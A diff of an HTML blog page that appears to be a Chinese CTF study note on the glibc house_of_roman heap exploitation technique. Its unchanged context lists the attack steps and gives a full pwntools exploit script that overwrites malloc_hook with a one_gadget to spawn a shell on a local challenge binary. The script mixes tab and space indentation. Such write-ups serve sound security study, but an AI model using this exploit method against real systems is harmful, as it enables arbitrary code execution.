@@ -16,7 +16,7 @@
 
 <html class="theme-next mist use-motion" lang="zh-CN">
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="0x00house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路 首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时chunk2 +">
+  <meta name="description" content="0x00 house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路  首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时c">
 <meta name="keywords" content="Linux">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IS-pwn-Linux-glibc-2.23-house_of_roman">
 <meta property="og:url" content="https://hitworld.github.io/posts/572debf3/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="0x00house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路 首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时chunk2 +">
+<meta property="og:description" content="0x00 house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路  首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时c">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2020-08-09T06:34:17.806Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-glibc-2.23-house_of_roman">
-<meta name="twitter:description" content="0x00house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路 首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时chunk2 +">
+<meta name="twitter:description" content="0x00 house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路  首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时c">
 
 
 
@@ -185,7 +185,7 @@
       .logo-line-after i { right: initial; }
     }
   </style>
-</noscript>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </head>
 
@@ -196,7 +196,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -537,8 +537,10 @@
       
 
       
-        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><code>house_of_roman</code>利用条件,可以修改<code>free chunk</code>的<code>fd</code>,可以溢出下一个<code>chunk</code>的<code>size</code>.</p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+        <h2 id="x00">0x00</h2>
+<p><code>house_of_roman</code>利用条件,可以修改<code>free chunk</code>的<code>fd</code>,可以溢出下一个<code>chunk</code>的<code>size</code>.</p>
+<h2 id="利用思路">利用思路</h2>
+<ol type="1">
 <li>首先分配<code>3</code>个<code>chunk</code>,大小分别为<code>0x20</code>,<code>0xd0</code>,<code>0x70</code>.</li>
 <li>在<code>chunk2 + 0x78</code>处设置<code>p64(0x61)</code>,作用是<code>fake size</code>,用于后面的<code>fastbin attack</code>.</li>
 <li>释放掉<code>chunk2</code>,再次分配<code>0xd0</code>,会分配到<code>chunk2</code>,此时<code>chunk2 + 0x10</code>和<code>chunk2 + 0x18</code>中存在<code>main_arean</code>地址.</li>
@@ -547,7 +549,8 @@
 <li>此时<code>malloc_hook</code>内容为<code>0</code>,然后利用<code>unsorted bin</code>修改<code>malloc_hook</code>内容为<code>main_arean</code>的地址,利用部分写修改<code>malloc_hook</code>为<code>one_gadget</code>(注意,这里需要爆破<code>1/4096</code>).</li>
 <li>多次释放一个指针,触发<code>double free</code>异常,进而触发<code>malloc_printerr</code>,<code>getshell</code>.</li>
 </ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>该题源于:<code>https://github.com/romanking98/House-Of-Roman</code>.</p>
+<h2 id="exp">exp</h2>
+<p>该题源于:<code>https://github.com/romanking98/House-Of-Roman</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, index)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"3. Free"</span>, <span class="string">"1"</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">":"</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">":"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">"3. Free"</span>, <span class="string">"3"</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">":"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"3. Free"</span>, <span class="string">"2"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">":"</span>, str(index))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./new_chall"</span>, env=&#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc-2.24.so"</span>&#125;)</span><br><span class="line">r.sendlineafter(<span class="string">":"</span>, <span class="string">"a"</span> * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="number">0</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x68</span> + p64(<span class="number">0x61</span>))</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">24</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">15</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">16</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">17</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">18</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"\x20"</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"\xcd\x4a"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(15)</span></span><br><span class="line"><span class="comment"># edit(15, p64(0x00))</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"a"</span> * <span class="number">8</span> + <span class="string">"\xe0\x4a"</span>)</span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">0x13</span> + <span class="string">"\x4f\x39\x5b"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>, <span class="number">7</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	resp = r.recv(<span class="number">4</span>, timeout=<span class="number">6</span>)</span><br><span class="line">	r.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	r.close()</span><br></pre></td></tr></table></figure>
 
       
@@ -863,7 +866,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
             
 
           </div>
@@ -895,7 +898,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">710k</span>
+    <span title="站点总字数">720k</span>
   
 
   
@@ -904,7 +907,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:46</span>
+    <span title="站点阅读时长">10:54</span>
   
 </div>
 
@@ -1555,5 +1558,5 @@
   
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 </html>
